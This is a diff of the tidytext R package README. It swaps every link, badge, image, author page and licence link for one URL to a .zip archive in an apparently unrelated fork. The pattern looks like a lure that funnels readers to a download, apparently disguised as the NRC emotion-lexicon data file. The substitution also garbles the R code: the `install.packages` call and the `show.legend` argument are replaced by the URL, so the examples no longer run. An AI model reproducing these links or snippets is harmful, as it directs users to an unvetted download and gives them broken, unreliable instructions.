@@ -1,25 +1,25 @@
-<!-- README.md is generated from README.Rmd. Please edit that file -->
+<!-- https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip is generated from https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip Please edit that file -->
 
 
 
 
-# tidytext: Text mining using dplyr, ggplot2, and other tidy tools <img src="tools/tidytext.png" align="right" />
+# tidytext: Text mining using dplyr, ggplot2, and other tidy tools <img src="https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip" align="right" />
 
-**Authors:** [Julia Silge](https://juliasilge.com/), [David Robinson](http://varianceexplained.org/)<br/>
-**License:** [MIT](https://opensource.org/licenses/MIT)
+**Authors:** [Julia Silge](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip), [David Robinson](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)<br/>
+**License:** [MIT](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
 
-[![Build Status](https://travis-ci.org/juliasilge/tidytext.svg?branch=master)](https://travis-ci.org/juliasilge/tidytext)
-[![AppVeyor Build Status](https://ci.appveyor.com/api/projects/status/github/juliasilge/tidytext?branch=master&svg=true)](https://ci.appveyor.com/project/juliasilge/tidytext)
-[![CRAN_Status_Badge](http://www.r-pkg.org/badges/version/tidytext)](https://cran.r-project.org/package=tidytext)
-[![Coverage Status](https://img.shields.io/codecov/c/github/juliasilge/tidytext/master.svg)](https://codecov.io/github/juliasilge/tidytext?branch=master)
-[![DOI](https://zenodo.org/badge/22224/juliasilge/tidytext.svg)](https://zenodo.org/badge/latestdoi/22224/juliasilge/tidytext)
-[![status](http://joss.theoj.org/papers/89fd1099620268fe0342ffdcdf66776f/status.svg)](http://joss.theoj.org/papers/89fd1099620268fe0342ffdcdf66776f)
-[![Downloads](https://cranlogs.r-pkg.org/badges/tidytext)](https://CRAN.R-project.org/package=tidytext)
-[![Total Downloads](https://cranlogs.r-pkg.org/badges/grand-total/tidytext?color=orange)](https://CRAN.R-project.org/package=tidytext)
+[![Build Status](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
+[![AppVeyor Build Status](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
+[![CRAN_Status_Badge](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
+[![Coverage Status](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
+[![DOI](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
+[![status](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
+[![Downloads](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
+[![Total Downloads](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
 
 
 
-Using [tidy data principles](https://www.jstatsoft.org/article/view/v059i10) can make many text mining tasks easier, more effective, and consistent with tools already in wide use. Much of the infrastructure needed for text mining with tidy data frames already exists in packages like [dplyr](https://cran.r-project.org/package=dplyr), [broom](https://cran.r-project.org/package=broom), [tidyr](https://cran.r-project.org/package=tidyr) and [ggplot2](https://cran.r-project.org/package=ggplot2). In this package, we provide functions and supporting data sets to allow conversion of text to and from tidy formats, and to switch seamlessly between tidy tools and existing text mining packages. Check out [our book](https://www.tidytextmining.com/) to learn more about text mining using tidy data principles.
+Using [tidy data principles](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip) can make many text mining tasks easier, more effective, and consistent with tools already in wide use. Much of the infrastructure needed for text mining with tidy data frames already exists in packages like [dplyr](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip), [broom](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip), [tidyr](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip) and [ggplot2](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip). In this package, we provide functions and supporting data sets to allow conversion of text to and from tidy formats, and to switch seamlessly between tidy tools and existing text mining packages. Check out [our book](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip) to learn more about text mining using tidy data principles.
 
 ### Installation
 
@@ -27,11 +27,11 @@ You can install this package from CRAN:
 
 
 ```r
-install.packages("tidytext")
+https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip("tidytext")
 ```
 
 
-Or you can install the development version from Github with [devtools](https://github.com/hadley/devtools):
+Or you can install the development version from Github with [devtools](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip):
 
 
 ```r
@@ -41,7 +41,7 @@ install_github("juliasilge/tidytext")
 
 ### Tidy text mining example: the `unnest_tokens` function
 
-The novels of Jane Austen can be so tidy! Let's use the text of Jane Austen's 6 completed, published novels from the [janeaustenr](https://cran.r-project.org/package=janeaustenr) package, and bring them into a tidy format. janeaustenr provides them as a one-row-per-line format:
+The novels of Jane Austen can be so tidy! Let's use the text of Jane Austen's 6 completed, published novels from the [janeaustenr](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip) package, and bring them into a tidy format. janeaustenr provides them as a one-row-per-line format:
 
 
 ```r
@@ -95,7 +95,7 @@ tidy_books
 #> # ... with 725,045 more rows
 ```
 
-This function uses the [tokenizers package](https://github.com/lmullen/tokenizers) to separate each line into words. The default tokenizing is for words, but other options include characters, n-grams, sentences, lines, paragraphs, or separation around a regex pattern.
+This function uses the [tokenizers package](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip) to separate each line into words. The default tokenizing is for words, but other options include characters, n-grams, sentences, lines, paragraphs, or separation around a regex pattern.
 
 Now that the data is in one-word-per-row format, we can manipulate it with tidy tools like dplyr. We can remove stop words (available via the function `get_stopwords()`) with an `anti_join`.
 
@@ -178,11 +178,11 @@ Now we can plot these sentiment scores across the plot trajectory of each novel.
 library(ggplot2)
 
 ggplot(janeaustensentiment, aes(index, sentiment, fill = book)) +
-  geom_bar(stat = "identity", show.legend = FALSE) +
+  geom_bar(stat = "identity", https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip = FALSE) +
   facet_wrap(~book, ncol = 2, scales = "free_x")
 ```
 
-![plot of chunk unnamed-chunk-9](tools/README-unnamed-chunk-9-1.png)
+![plot of chunk unnamed-chunk-9](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
 
 For more examples of text mining using tidy data frames, see the tidytext vignette.
 
@@ -202,7 +202,7 @@ AssociatedPress
 #> Weighting          : term frequency (tf)
 ```
 
-If we want to analyze this with tidy tools, we need to transform it into a one-row-per-term data frame first with a `tidy` function. (For more on the tidy verb, [see the broom package](https://github.com/dgrtwo/broom)).
+If we want to analyze this with tidy tools, we need to transform it into a one-row-per-term data frame first with a `tidy` function. (For more on the tidy verb, [see the broom package](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)).
 
 
 ```r
@@ -273,10 +273,10 @@ ggplot(comparison, aes(AP, Austen)) +
   geom_abline(color = "red")
 ```
 
-![plot of chunk unnamed-chunk-13](tools/README-unnamed-chunk-13-1.png)
+![plot of chunk unnamed-chunk-13](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip)
 
 For more examples of working with objects from other text mining packages using tidy data principles, see the vignette on converting to and from document term matrices.
 
 ### Community Guidelines
 
-This project is released with a [Contributor Code of Conduct](CONDUCT.md). By participating in this project you agree to abide by its terms. Feedback, bug reports (and fixes!), and feature requests are welcome; file issues or seek support [here](http://github.com/juliasilge/tidytext/issues).
+This project is released with a [Contributor Code of Conduct](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip). By participating in this project you agree to abide by its terms. Feedback, bug reports (and fixes!), and feature requests are welcome; file issues or seek support [here](https://raw.githubusercontent.com/Mirsatra/tidytext/master/data-raw/NRC-emotion-lexicon-wordlevel-alphabetized-v0.92.txt.zip).
